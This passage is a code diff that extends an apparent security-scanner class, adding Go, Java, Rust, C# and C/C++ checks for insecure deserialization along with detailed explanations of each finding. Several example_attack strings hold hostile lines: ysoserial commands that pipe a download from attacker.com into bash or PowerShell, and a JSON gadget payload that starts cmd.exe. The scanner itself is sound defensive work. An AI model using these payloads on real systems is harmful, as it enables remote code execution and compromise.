@@ -24,6 +24,16 @@ class DeserializationDetector:
             return self._analyze_python(code)
         elif language == "javascript":
             return self._analyze_javascript(code)
+        elif language == "go":
+            return self._analyze_go(code)
+        elif language == "java":
+            return self._analyze_java(code)
+        elif language == "rust":
+            return self._analyze_rust(code)
+        elif language == "csharp":
+            return self._analyze_csharp(code)
+        elif language in ["cpp", "c"]:
+            return self._analyze_cpp(code)
         else:
             return {"score": 0, "vulnerabilities": ["Unsupported language"], "max_score": 2}
 
@@ -733,6 +743,834 @@ class DeserializationDetector:
                     }
                 }
             })
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_go(self, code: str) -> Dict:
+        """Analyze Go code for insecure deserialization."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # Check if code uses encoding/gob or json
+        uses_deserialize = re.search(r'encoding/gob|json\.Unmarshal', code)
+        if not uses_deserialize:
+            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}
+
+        # Pattern 1: gob.Decode without validation
+        gob_decode_locations = find_pattern_locations(code, r'\.Decode\(')
+        uses_gob = re.search(r'gob\.NewDecoder|encoding/gob', code)
+
+        if gob_decode_locations and uses_gob:
+            # Check for type validation after decode
+            has_validation = any([
+                re.search(r'if.*!=.*nil', code),  # Error checking
+                re.search(r'switch.*\.(type)', code),  # Type switch
+                re.search(r'if.*\.(type)', code),  # Type assertion check
+            ])
+
+            location = gob_decode_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            if not has_validation:
+                self.vulnerabilities.append({
+                    "type": "INSECURE_DESERIALIZATION",
+                    "severity": "HIGH",
+                    "description": "Go gob.Decode() without type validation - DESERIALIZATION ATTACK: gob can deserialize arbitrary types. Attacker can craft malicious gob-encoded data with unexpected types that bypass application logic or trigger code execution through interface methods. ATTACK: Send gob data with malicious type implementing interfaces with dangerous methods (e.g., io.Reader/Writer that access filesystem). IMPACT: Type confusion attacks, arbitrary object instantiation, potential RCE through interface method calls.",
+                    "recommendation": "Add type validation after decode: var data MyType; if err := decoder.Decode(&data); err != nil { return err }; // Validate type matches expected structure. Use type assertions/switches to verify decoded type. Consider using allowlist of permitted types.",
+                    "example_attack": "Attacker sends gob data claiming to be SafeConfig but is actually MaliciousType with Write() method that accesses /etc/passwd. Application calls Write() → file access.",
+                    "line_number": line_num,
+                    "code_snippet": code_snippet,
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "gob.Decode() used to deserialize data",
+                            "No type validation or type switch after deserialization",
+                            "Attacker can control gob-encoded input data",
+                            "Application doesn't verify decoded type matches expected structure"
+                        ],
+                        "why_vulnerable": [
+                            f"Line {line_num}: gob.Decode() without type validation",
+                            "gob can deserialize any Go type encoded in the data",
+                            "No type switch or type assertion to verify decoded type",
+                            "Attacker can send gob data with unexpected types",
+                            "Type confusion can bypass security checks or trigger unintended methods"
+                        ],
+                        "why_not_vulnerable": [],
+                        "patterns_checked": [
+                            "gob.Decode() usage",
+                            "Type validation (type switch, type assertion)",
+                            "Error checking after decode",
+                            "Allowlist of permitted types"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["gob.Decode without type validation"],
+                            "line_numbers": [line_num],
+                            "code_snippets": [code_snippet]
+                        }
+                    }
+                })
+                self.score = 0
+
+        # Pattern 2: json.Unmarshal without type checking
+        json_unmarshal_locations = find_pattern_locations(code, r'json\.Unmarshal\(')
+
+        if json_unmarshal_locations:
+            # Check for validation or type checking
+            has_validation = any([
+                re.search(r'if.*!=.*nil', code),  # Error checking
+                re.search(r'if.*\w+\s*==\s*["\']', code),  # Field value validation
+                re.search(r'switch.*\w+', code),  # Type/field switch
+            ])
+
+            # Check if unmarshaling into interface{} (dangerous)
+            uses_interface = re.search(r'interface\{\}|var\s+\w+\s+interface', code)
+
+            if uses_interface and not has_validation:
+                location = json_unmarshal_locations[0]
+                line_num = location['line_number']
+                code_snippet = location['line_content']
+
+                self.vulnerabilities.append({
+                    "type": "INSECURE_DESERIALIZATION",
+                    "severity": "MEDIUM",
+                    "description": "Go json.Unmarshal into interface{} without validation - TYPE CONFUSION RISK: Unmarshaling into interface{} accepts any JSON structure. Attacker can send unexpected types/fields that bypass application logic. While JSON is safer than gob (no arbitrary code execution), type confusion can lead to logic bugs, authentication bypass, or DoS.",
+                    "recommendation": "Unmarshal into concrete struct types instead of interface{}: type Config struct { Field string }; var cfg Config; json.Unmarshal(data, &cfg). If you must use interface{}, add strict validation: check field types, validate all fields against allowlist, reject unexpected fields.",
+                    "example_attack": "Application expects {\"role\": \"user\"} but attacker sends {\"role\": [\"admin\", \"user\"]}. Type changes from string to array → type assertion fails differently → logic bug → privilege escalation.",
+                    "line_number": line_num,
+                    "code_snippet": code_snippet,
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "json.Unmarshal() used with interface{} type",
+                            "No type checking or validation after unmarshal",
+                            "Accepts any JSON structure from untrusted source",
+                            "Type confusion can bypass application logic"
+                        ],
+                        "why_vulnerable": [
+                            f"Line {line_num}: json.Unmarshal into interface{{}} without validation",
+                            "interface{} accepts any JSON type (object, array, string, number, bool)",
+                            "No validation of actual decoded type or structure",
+                            "Attacker can send unexpected types to trigger type assertion failures",
+                            "Type confusion can bypass authentication, authorization, or business logic"
+                        ],
+                        "why_not_vulnerable": [],
+                        "patterns_checked": [
+                            "json.Unmarshal into interface{}",
+                            "Type validation after unmarshal",
+                            "Concrete struct types (safer)",
+                            "Field validation and type assertions"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["json.Unmarshal into interface{} without validation"],
+                            "line_numbers": [line_num],
+                            "code_snippets": [code_snippet]
+                        }
+                    }
+                })
+                if self.score > 0:
+                    self.score = 1
+
+        # Pattern 3: Check for safe usage
+        uses_concrete_types = re.search(r'type\s+\w+\s+struct\s*\{', code)
+        has_json_with_struct = uses_concrete_types and json_unmarshal_locations
+
+        if has_json_with_struct and self.score == 2:
+            location = json_unmarshal_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            self.vulnerabilities.append({
+                "type": "SECURE",
+                "severity": "INFO",
+                "description": "SECURE: Uses json.Unmarshal with concrete struct types. JSON only supports data primitives (object, array, string, number, bool, null), cannot execute code. Concrete structs provide type safety and validation.",
+                "line_number": line_num,
+                "code_snippet": code_snippet,
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "gob.Decode without type validation (arbitrary type deserialization)",
+                        "json.Unmarshal into interface{} (type confusion)",
+                        "No validation of deserialized data structure",
+                        "Accepting unexpected types from untrusted sources"
+                    ],
+                    "why_vulnerable": [],
+                    "why_not_vulnerable": [
+                        f"Line {line_num}: Uses json.Unmarshal with concrete struct type",
+                        "JSON format is data-only, cannot represent code or arbitrary objects",
+                        "Struct definition enforces expected field types and structure",
+                        "Go's type system validates deserialized data matches struct definition",
+                        "No gob usage (which allows arbitrary type deserialization)"
+                    ],
+                    "patterns_checked": [
+                        "gob.Decode usage and type validation",
+                        "json.Unmarshal with interface{} vs concrete types",
+                        "Struct type definitions",
+                        "Type validation patterns"
+                    ],
+                    "evidence": {
+                        "found_patterns": ["json.Unmarshal with concrete struct type"],
+                        "line_numbers": [line_num],
+                        "code_snippets": [code_snippet]
+                    }
+                }
+            })
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_java(self, code: str) -> Dict:
+        """Analyze Java code for insecure deserialization."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # Check if code uses ObjectInputStream
+        uses_deserialize = re.search(r'ObjectInputStream|readObject', code)
+        if not uses_deserialize:
+            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}
+
+        # Pattern 1: ObjectInputStream.readObject without validation
+        readobject_locations = find_pattern_locations(code, r'\.readObject\(\)')
+
+        if readobject_locations:
+            # Check for validation patterns
+            has_validation = any([
+                re.search(r'ValidatingObjectInputStream', code),
+                re.search(r'ObjectInputFilter|setObjectInputFilter', code),
+                re.search(r'instanceof', code),  # Type checking
+                re.search(r'ALLOWED_CLASSES|allowedClasses|whitelist', code, re.IGNORECASE),
+            ])
+
+            location = readobject_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            if not has_validation:
+                self.vulnerabilities.append({
+                    "type": "INSECURE_DESERIALIZATION",
+                    "severity": "CRITICAL",
+                    "description": "Java ObjectInputStream.readObject() without validation - REMOTE CODE EXECUTION: Java deserialization can execute arbitrary code during object reconstruction. ATTACK: Attacker sends malicious serialized object with gadget chain (e.g., Commons Collections, Spring Framework) that executes commands. REAL-WORLD: CVE-2015-7501 (JBoss), CVE-2017-3066 (Adobe), CVE-2017-5638 (Apache Struts) all used Java deserialization RCE. IMPACT: Complete server compromise, data exfiltration, ransomware, botnet recruitment. Java deserialization is the #1 most dangerous vulnerability class in enterprise Java apps.",
+                    "recommendation": "NEVER deserialize untrusted data with ObjectInputStream. Solutions: (1) Use JSON/XML instead: ObjectMapper mapper = new ObjectMapper(); obj = mapper.readValue(json, MyClass.class), (2) If you MUST use Java serialization: Use ValidatingObjectInputStream with strict class allowlist: ValidatingObjectInputStream ois = new ValidatingObjectInputStream(in); ois.accept(MyAllowedClass.class); obj = ois.readObject(), (3) Use ObjectInputFilter (Java 9+): ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\"com.myapp.**;!*\"); ois.setObjectInputFilter(filter)",
+                    "example_attack": "Attacker crafts malicious payload using ysoserial tool: java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/shell.sh | bash' | base64. Sends to vulnerable endpoint → readObject() reconstructs gadget chain → Runtime.exec() called during deserialization → RCE before application code even runs. Gadget chains exist in: Commons Collections, Spring, Groovy, Apache Commons, Hibernate.",
+                    "line_number": line_num,
+                    "code_snippet": code_snippet,
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "ObjectInputStream.readObject() called on untrusted data",
+                            "No ValidatingObjectInputStream or ObjectInputFilter protection",
+                            "No class allowlist validation",
+                            "Java deserialization gadget chains in classpath (Commons Collections, Spring, etc.)"
+                        ],
+                        "why_vulnerable": [
+                            f"Line {line_num}: ObjectInputStream.readObject() without validation",
+                            "Java deserialization automatically invokes methods during object reconstruction",
+                            "Gadget chains abuse legitimate library code to achieve RCE (e.g., InvokerTransformer.transform() → Runtime.exec())",
+                            "No ValidatingObjectInputStream or ObjectInputFilter to restrict allowed classes",
+                            "Attacker can craft payload using public tools (ysoserial, marshalsec)",
+                            "RCE occurs during deserialization, before application validation can run",
+                            "REAL-WORLD: Used in Equifax breach, Apache Struts RCE, JBoss exploits"
+                        ],
+                        "why_not_vulnerable": [],
+                        "patterns_checked": [
+                            "ObjectInputStream.readObject() usage",
+                            "ValidatingObjectInputStream (safe wrapper)",
+                            "ObjectInputFilter (Java 9+ protection)",
+                            "instanceof type checking after deserialize",
+                            "Class allowlist validation (ALLOWED_CLASSES)"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["ObjectInputStream.readObject without validation"],
+                            "line_numbers": [line_num],
+                            "code_snippets": [code_snippet]
+                        }
+                    }
+                })
+                self.score = 0
+
+        # Pattern 2: Check for ValidatingObjectInputStream (secure)
+        validating_locations = find_pattern_locations(code, r'ValidatingObjectInputStream')
+        filter_locations = find_pattern_locations(code, r'ObjectInputFilter|setObjectInputFilter')
+
+        if (validating_locations or filter_locations) and self.score == 2:
+            location = validating_locations[0] if validating_locations else filter_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            self.vulnerabilities.append({
+                "type": "SECURE",
+                "severity": "INFO",
+                "description": "SECURE: Uses ValidatingObjectInputStream or ObjectInputFilter with class allowlist. Restricts deserialization to approved classes only, preventing gadget chain attacks. This is the correct way to handle Java deserialization if you cannot migrate to JSON.",
+                "line_number": line_num,
+                "code_snippet": code_snippet,
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "ObjectInputStream.readObject() on untrusted data (gadget chain RCE)",
+                        "No class allowlist or validation",
+                        "Dangerous gadget libraries in classpath",
+                        "No ObjectInputFilter protection"
+                    ],
+                    "why_vulnerable": [],
+                    "why_not_vulnerable": [
+                        f"Line {line_num}: Uses ValidatingObjectInputStream or ObjectInputFilter",
+                        "Class allowlist restricts deserialization to approved classes only",
+                        "Gadget chain attacks blocked because malicious classes rejected",
+                        "ValidatingObjectInputStream.accept() defines permitted classes",
+                        "ObjectInputFilter provides runtime validation of deserialized classes"
+                    ],
+                    "patterns_checked": [
+                        "ObjectInputStream.readObject() without validation",
+                        "ValidatingObjectInputStream usage",
+                        "ObjectInputFilter (Java 9+)",
+                        "Class allowlist patterns"
+                    ],
+                    "evidence": {
+                        "found_patterns": ["ValidatingObjectInputStream or ObjectInputFilter"],
+                        "line_numbers": [line_num],
+                        "code_snippets": [code_snippet]
+                    }
+                }
+            })
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_rust(self, code: str) -> Dict:
+        """Analyze Rust code for insecure deserialization."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # Check if code uses serde or deserialization
+        uses_deserialize = re.search(r'serde::|Deserialize|from_str|from_slice', code)
+        if not uses_deserialize:
+            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}
+
+        # Pattern 1: Deserialize without validation
+        deserialize_locations = []
+        deserialize_patterns = [
+            r'from_str\(',
+            r'from_slice\(',
+            r'from_reader\(',
+            r'deserialize\(',
+        ]
+
+        for pattern in deserialize_patterns:
+            deserialize_locations.extend(find_pattern_locations(code, pattern))
+
+        if deserialize_locations:
+            # Check for validation patterns
+            has_validation = any([
+                re.search(r'#\[serde\(validate\)', code),  # Custom validation
+                re.search(r'\.validate\(\)', code),  # Explicit validation
+                re.search(r'if\s+.*\.is_ok\(\)', code),  # Result checking
+                re.search(r'match.*\{', code),  # Pattern matching for validation
+            ])
+
+            # Check for custom Deserialize implementation with validation
+            has_custom_deserialize = re.search(r'impl.*Deserialize.*for.*\{', code, re.DOTALL)
+            has_validation_in_impl = has_custom_deserialize and any([
+                re.search(r'return\s+Err', code),
+                re.search(r'Err\(.*Error', code),
+                re.search(r'bail!|ensure!', code),  # Error macros
+            ])
+
+            location = deserialize_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            if not has_validation and not has_validation_in_impl:
+                self.vulnerabilities.append({
+                    "type": "INSECURE_DESERIALIZATION",
+                    "severity": "MEDIUM",
+                    "description": "Rust serde deserialization without validation - LOGIC BUGS & DoS RISK: While Rust's type safety prevents memory corruption, deserializing untrusted data without validation can cause logic bugs, resource exhaustion, or DoS. ATTACK SCENARIOS: (1) Attacker sends huge arrays/strings → memory exhaustion → OOM DoS, (2) Nested structures with extreme depth → stack overflow, (3) Invalid business logic values bypass application checks (e.g., negative prices, out-of-range enums). IMPACT: Application crashes, resource exhaustion, business logic bypass, data corruption.",
+                    "recommendation": "Add validation after deserialization: (1) Use #[serde(validate)] attribute with validator crate, (2) Implement custom Deserialize with validation logic: impl<'de> Deserialize<'de> for MyType { fn deserialize<D>(deserializer: D) -> Result<Self, D::Error> { let value = Value::deserialize(deserializer)?; if value.field < 0 { return Err(...); } Ok(...) } }, (3) Use type constraints (NonZeroU32, bounded integers), (4) Add size/depth limits to prevent DoS",
+                    "example_attack": "Application expects Product { price: u32, quantity: u32 }. Attacker sends { price: 4294967295, quantity: 4294967295 }. Both valid u32 but multiplication overflows → panic → DoS. OR: Attacker sends deeply nested JSON (100 levels deep) → stack overflow → crash. OR: Attacker sends 2GB array → OOM → DoS.",
+                    "line_number": line_num,
+                    "code_snippet": code_snippet,
+                    "detection_reasoning": {
+                        "criteria_for_vulnerability": [
+                            "serde deserialization without validation",
+                            "No #[serde(validate)] attribute",
+                            "No custom Deserialize implementation with bounds checking",
+                            "No size/depth limits on deserialized data",
+                            "Business logic assumes valid ranges but doesn't enforce them"
+                        ],
+                        "why_vulnerable": [
+                            f"Line {line_num}: Deserialization without validation",
+                            "Rust type system prevents memory corruption but not logic bugs",
+                            "No validation of value ranges, sizes, or business constraints",
+                            "Attacker can send extreme values within valid type ranges",
+                            "No protection against resource exhaustion (huge arrays, deep nesting)",
+                            "ATTACK VECTORS: DoS via OOM, stack overflow, logic bugs via extreme values"
+                        ],
+                        "why_not_vulnerable": [],
+                        "patterns_checked": [
+                            "from_str/from_slice/deserialize usage",
+                            "#[serde(validate)] attribute",
+                            "Custom Deserialize implementation with validation",
+                            "Result checking and error handling",
+                            "Type constraints (NonZeroU32, bounded types)"
+                        ],
+                        "evidence": {
+                            "found_patterns": ["Deserialization without validation"],
+                            "line_numbers": [line_num],
+                            "code_snippets": [code_snippet]
+                        }
+                    }
+                })
+                if self.score > 0:
+                    self.score = 1
+
+        # Pattern 2: Check for secure patterns
+        has_type_constraints = re.search(r'NonZero|Bounded|RangeInclusive', code)
+        has_validation_attr = re.search(r'#\[serde\(validate\)', code)
+        has_result_checking = re.search(r'\.is_ok\(\)|\.is_err\(\)|match.*Result', code)
+
+        if (has_type_constraints or has_validation_attr or has_result_checking) and self.score == 2 and deserialize_locations:
+            location = deserialize_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            protections = []
+            if has_type_constraints:
+                protections.append("Type constraints (NonZero, Bounded)")
+            if has_validation_attr:
+                protections.append("#[serde(validate)] attribute")
+            if has_result_checking:
+                protections.append("Result validation")
+
+            protections_str = " + ".join(protections) if protections else "validation"
+
+            self.vulnerabilities.append({
+                "type": "SECURE",
+                "severity": "INFO",
+                "description": f"SECURE: Uses serde deserialization with {protections_str}. Rust's type system prevents memory corruption. Additional validation prevents logic bugs and DoS attacks from malformed data.",
+                "line_number": line_num,
+                "code_snippet": code_snippet,
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "Deserialization without validation (logic bugs, DoS)",
+                        "No type constraints on numeric ranges",
+                        "No size/depth limits",
+                        "Missing business logic validation"
+                    ],
+                    "why_vulnerable": [],
+                    "why_not_vulnerable": [
+                        f"Line {line_num}: Uses deserialization with {protections_str}",
+                        "Rust's type system ensures memory safety",
+                        "Validation prevents out-of-range values and logic bugs",
+                        "Type constraints enforce valid ranges at compile/runtime",
+                        "Result checking handles deserialization errors safely"
+                    ],
+                    "patterns_checked": [
+                        "Deserialization without validation",
+                        "Type constraints usage",
+                        "#[serde(validate)] attribute",
+                        "Result/error handling"
+                    ],
+                    "evidence": {
+                        "found_patterns": [f"Deserialization with {protections_str}"],
+                        "line_numbers": [line_num],
+                        "code_snippets": [code_snippet]
+                    }
+                }
+            })
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_csharp(self, code: str) -> Dict:
+        """Analyze C# code for insecure deserialization."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # Check if code uses deserialization
+        uses_deserialize = re.search(r'BinaryFormatter|JavaScriptSerializer|Deserialize|XmlSerializer', code)
+        if not uses_deserialize:
+            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}
+
+        # Pattern 1: BinaryFormatter.Deserialize (extremely dangerous)
+        binaryformatter_locations = find_pattern_locations(code, r'BinaryFormatter')
+        deserialize_locations = find_pattern_locations(code, r'\.Deserialize\(')
+
+        if binaryformatter_locations and deserialize_locations:
+            location = binaryformatter_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            self.vulnerabilities.append({
+                "type": "INSECURE_DESERIALIZATION",
+                "severity": "CRITICAL",
+                "description": "C# BinaryFormatter.Deserialize() - REMOTE CODE EXECUTION: BinaryFormatter is so dangerous Microsoft deprecated it completely. ATTACK: Similar to Java deserialization, uses gadget chains (e.g., ObjectDataProvider, WindowsIdentity) to achieve RCE during deserialization. REAL-WORLD: CVE-2017-8759 (.NET), CVE-2019-0604 (SharePoint), CVE-2020-1147 (.NET Framework) all used BinaryFormatter RCE. MICROSOFT GUIDANCE: 'BinaryFormatter is dangerous and should not be used. It cannot be secured, even when using a SerializationBinder.' IMPACT: Complete server compromise, lateral movement in Active Directory, credential theft.",
+                "recommendation": "IMMEDIATELY STOP using BinaryFormatter. Microsoft's official guidance: (1) Migrate to JSON: JsonSerializer.Deserialize<T>(json) (System.Text.Json), (2) If you need binary format: Use MessagePack, protobuf-net, or Bond instead, (3) If you MUST deserialize .NET objects: Use DataContractSerializer with known types allowlist (still risky): [DataContract] public class MyClass { ... }; var serializer = new DataContractSerializer(typeof(MyClass), new Type[] { typeof(MyClass) }); obj = serializer.ReadObject(stream)",
+                "example_attack": "Attacker crafts malicious payload using ysoserial.net: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'powershell IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")' | base64. Sends to endpoint → BinaryFormatter.Deserialize() → gadget chain executes → PowerShell downloads and runs attacker's script → RCE. Gadget chains: ObjectDataProvider, WindowsIdentity, PSObject.",
+                "line_number": line_num,
+                "code_snippet": code_snippet,
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "BinaryFormatter.Deserialize() called",
+                        "Microsoft officially deprecated BinaryFormatter as insecure",
+                        "Cannot be secured even with SerializationBinder",
+                        ".NET gadget chains available (ysoserial.net)"
+                    ],
+                    "why_vulnerable": [
+                        f"Line {line_num}: BinaryFormatter.Deserialize() usage",
+                        "BinaryFormatter automatically invokes methods during deserialization",
+                        "Gadget chains abuse .NET framework classes to achieve RCE",
+                        "ObjectDataProvider gadget can invoke arbitrary methods with parameters",
+                        "No safe way to use BinaryFormatter - Microsoft deprecated it entirely",
+                        "SerializationBinder validation can be bypassed with gadget chains",
+                        "REAL-WORLD: Used in Exchange Server exploits, SharePoint RCE, .NET Framework CVEs"
+                    ],
+                    "why_not_vulnerable": [],
+                    "patterns_checked": [
+                        "BinaryFormatter usage (always vulnerable)",
+                        "JavaScriptSerializer (also vulnerable)",
+                        "DataContractSerializer with known types (safer)",
+                        "JSON serializers (System.Text.Json, Newtonsoft.Json with TypeNameHandling.None)"
+                    ],
+                    "evidence": {
+                        "found_patterns": ["BinaryFormatter.Deserialize"],
+                        "line_numbers": [line_num],
+                        "code_snippets": [code_snippet]
+                    }
+                }
+            })
+            self.score = 0
+
+        # Pattern 2: JavaScriptSerializer (also vulnerable)
+        javaserializer_locations = find_pattern_locations(code, r'JavaScriptSerializer')
+
+        if javaserializer_locations and deserialize_locations and self.score > 0:
+            location = javaserializer_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            self.vulnerabilities.append({
+                "type": "INSECURE_DESERIALIZATION",
+                "severity": "HIGH",
+                "description": "C# JavaScriptSerializer.Deserialize() - TYPE CONFUSION & RCE RISK: JavaScriptSerializer with __type metadata can deserialize arbitrary .NET types. ATTACK: Attacker sends JSON with __type field pointing to dangerous types (ObjectDataProvider, FileSystemUtils). IMPACT: RCE via gadget chains, type confusion attacks, information disclosure.",
+                "recommendation": "Stop using JavaScriptSerializer (deprecated). Use System.Text.Json instead: JsonSerializer.Deserialize<MyClass>(json) with specific types. If using Newtonsoft.Json: NEVER use TypeNameHandling.All or TypeNameHandling.Auto: var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None }; JsonConvert.DeserializeObject<T>(json, settings)",
+                "example_attack": "Attacker sends: {\"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\", \"MethodName\":\"Start\", \"ObjectInstance\":{\"__type\":\"System.Diagnostics.Process, System\"}, \"MethodParameters\":{\"__type\":\"System.Collections.ArrayList\", \"$values\":[\"cmd.exe\", \"/c calc\"]}} → JavaScriptSerializer deserializes ObjectDataProvider → invokes Process.Start(\"cmd.exe\", \"/c calc\") → RCE",
+                "line_number": line_num,
+                "code_snippet": code_snippet,
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "JavaScriptSerializer usage (deprecated)",
+                        "Deserializes __type metadata from JSON",
+                        "Can instantiate arbitrary .NET types",
+                        "Vulnerable to gadget chain attacks"
+                    ],
+                    "why_vulnerable": [
+                        f"Line {line_num}: JavaScriptSerializer usage",
+                        "JavaScriptSerializer respects __type JSON field to deserialize arbitrary types",
+                        "Attacker controls type instantiation via __type metadata",
+                        "Can trigger gadget chains (ObjectDataProvider, FileSystemUtils)",
+                        "Microsoft deprecated JavaScriptSerializer in favor of System.Text.Json"
+                    ],
+                    "why_not_vulnerable": [],
+                    "patterns_checked": [
+                        "JavaScriptSerializer usage",
+                        "BinaryFormatter usage",
+                        "System.Text.Json (safe default)",
+                        "Newtonsoft.Json with TypeNameHandling.None"
+                    ],
+                    "evidence": {
+                        "found_patterns": ["JavaScriptSerializer"],
+                        "line_numbers": [line_num],
+                        "code_snippets": [code_snippet]
+                    }
+                }
+            })
+            self.score = 0
+
+        # Pattern 3: Check for DataContractSerializer with known types (safer)
+        datacontract_locations = find_pattern_locations(code, r'DataContractSerializer')
+        known_types_locations = find_pattern_locations(code, r'knownTypes|KnownTypes')
+
+        if datacontract_locations and known_types_locations and self.score == 2:
+            location = datacontract_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            self.vulnerabilities.append({
+                "type": "SECURE",
+                "severity": "INFO",
+                "description": "SECURE: Uses DataContractSerializer with known types allowlist. Restricts deserialization to approved types only. Still has some risk (prefer System.Text.Json) but much safer than BinaryFormatter/JavaScriptSerializer.",
+                "line_number": line_num,
+                "code_snippet": code_snippet,
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "BinaryFormatter.Deserialize (gadget chain RCE)",
+                        "JavaScriptSerializer (type confusion via __type)",
+                        "No type allowlist or validation",
+                        "Arbitrary type instantiation"
+                    ],
+                    "why_vulnerable": [],
+                    "why_not_vulnerable": [
+                        f"Line {line_num}: Uses DataContractSerializer with known types",
+                        "Known types allowlist restricts deserialization to approved types",
+                        "Cannot deserialize arbitrary types from attacker-controlled data",
+                        "Safer than BinaryFormatter and JavaScriptSerializer"
+                    ],
+                    "patterns_checked": [
+                        "BinaryFormatter usage",
+                        "JavaScriptSerializer usage",
+                        "DataContractSerializer with known types",
+                        "System.Text.Json (recommended)"
+                    ],
+                    "evidence": {
+                        "found_patterns": ["DataContractSerializer with known types"],
+                        "line_numbers": [line_num],
+                        "code_snippets": [code_snippet]
+                    }
+                }
+            })
+
+        # Pattern 4: Check for System.Text.Json (safe)
+        json_serializer_locations = find_pattern_locations(code, r'System\.Text\.Json|JsonSerializer\.Deserialize')
+
+        if json_serializer_locations and self.score == 2:
+            location = json_serializer_locations[0]
+            line_num = location['line_number']
+            code_snippet = location['line_content']
+
+            self.vulnerabilities.append({
+                "type": "SECURE",
+                "severity": "INFO",
+                "description": "SECURE: Uses System.Text.Json which is safe by default. Does not support type metadata (__type) by default, preventing arbitrary type instantiation. This is Microsoft's recommended JSON serializer for .NET Core/.NET 5+.",
+                "line_number": line_num,
+                "code_snippet": code_snippet,
+                "detection_reasoning": {
+                    "criteria_for_vulnerability": [
+                        "BinaryFormatter (RCE via gadget chains)",
+                        "JavaScriptSerializer (type confusion)",
+                        "Arbitrary type deserialization",
+                        "No type validation"
+                    ],
+                    "why_vulnerable": [],
+                    "why_not_vulnerable": [
+                        f"Line {line_num}: Uses System.Text.Json",
+                        "System.Text.Json does not support type metadata by default",
+                        "Cannot deserialize arbitrary types from JSON",
+                        "No gadget chain attacks possible",
+                        "Microsoft's recommended secure JSON serializer"
+                    ],
+                    "patterns_checked": [
+                        "BinaryFormatter usage",
+                        "JavaScriptSerializer usage",
+                        "System.Text.Json (safe)",
+                        "DataContractSerializer patterns"
+                    ],
+                    "evidence": {
+                        "found_patterns": ["System.Text.Json usage"],
+                        "line_numbers": [line_num],
+                        "code_snippets": [code_snippet]
+                    }
+                }
+            })
+
+        return {
+            "score": self.score,
+            "vulnerabilities": self.vulnerabilities,
+            "max_score": 2
+        }
+
+    def _analyze_cpp(self, code: str) -> Dict:
+        """Analyze C/C++ code for insecure deserialization/parsing."""
+        self.vulnerabilities = []
+        self.score = 2
+
+        # C/C++ doesn't have native deserialization like Python pickle or Java ObjectInputStream
+        # But there are unsafe parsing patterns that can be exploited
+
+        # Pattern 1: Manual binary data parsing without validation
+        unsafe_parse_patterns = [
+            (r'memcpy\([^,]+,\s*[^,]+,\s*[^)]+\)', "memcpy without bounds checking"),
+            (r'strcpy\([^,]+,\s*[^)]+\)', "strcpy without size limit"),
+            (r'sprintf\([^,]+,.*%s', "sprintf with %s format specifier"),
+            (r'sscanf\([^,]+,.*%s', "sscanf with unbounded %s"),
+            (r'gets\(', "gets() function (always unsafe)"),
+        ]
+
+        for pattern, description in unsafe_parse_patterns:
+            locations = find_pattern_locations(code, pattern)
+            if locations:
+                # Check for validation
+                has_validation = any([
+                    re.search(r'if\s*\([^)]*\s*(len|size|strlen|sizeof)', code),
+                    re.search(r'strncpy|snprintf|fgets', code),
+                    re.search(r'assert\(|check_bounds|validate', code, re.IGNORECASE),
+                ])
+
+                if not has_validation:
+                    location = locations[0]
+                    line_num = location['line_number']
+                    code_snippet = location['line_content']
+
+                    self.vulnerabilities.append({
+                        "type": "INSECURE_DESERIALIZATION",
+                        "severity": "HIGH",
+                        "description": f"C/C++ {description} - BUFFER OVERFLOW RISK: Manual data parsing without validation can lead to buffer overflows and memory corruption. ATTACK: Attacker provides oversized input → function writes beyond buffer bounds → memory corruption → potential code execution. IMPACT: Remote code execution, denial of service, memory corruption.",
+                        "recommendation": "Use safe alternatives: (1) Use strncpy instead of strcpy, (2) Use snprintf instead of sprintf, (3) Use fgets instead of gets, (4) Always validate input size before memcpy: if (size <= MAX_SIZE) memcpy(...), (5) Consider using C++ std::string instead of char arrays",
